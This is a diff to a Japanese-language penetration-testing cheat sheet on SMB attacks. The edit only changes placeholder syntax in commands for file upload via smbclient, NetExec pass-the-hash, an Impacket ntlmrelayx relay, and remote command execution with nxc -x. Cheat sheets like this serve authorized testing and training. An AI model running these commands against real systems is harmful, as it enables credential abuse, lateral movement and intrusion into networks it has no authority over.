@@ -371,17 +371,17 @@ netexec smb $TargetIP --gen-relay-list <output.txt>
 ※WRITE Permissionsが必要
 
 ```zsh
-smbclient //$TargetIP/[share] -U <username>%<password>
-smb: > put [local] [remote]
+smbclient //$TargetIP/<share> -U <username>%<password>
+smb: > put <local> <remote>
 ```
 
 ## Misc
 
-| 攻撃手法          | Tool                  | Command例                                        |
-| ------------- | --------------------- | ----------------------------------------------- |
-| Pass-the-Hash | NetExec               | `netexec smb $TargetIP -u <username> -H [NTLM]` |
-| SMB Relay     | Impacket (ntlmrelayx) | `impacket-ntlmrelayx -tf targets.txt`           |
-| 任意コマンド実行      | NetExec / Impacket    | `nxc smb $TargetIP -u user -p pass -x 'whoami'` |
+| 攻撃手法          | Tool                  | Command例                                          |
+| ------------- | --------------------- | ------------------------------------------------- |
+| Pass-the-Hash | NetExec               | `netexec smb $TargetIP -u <username> -H <NTLM>`   |
+| SMB Relay     | Impacket (ntlmrelayx) | `impacket-ntlmrelayx -tf <targets.txt>`           |
+| 任意コマンド実行      | NetExec / Impacket    | `nxc smb $TargetIP -u <user> -p <pw> -x 'whoami'` |
 
 ---
 ---
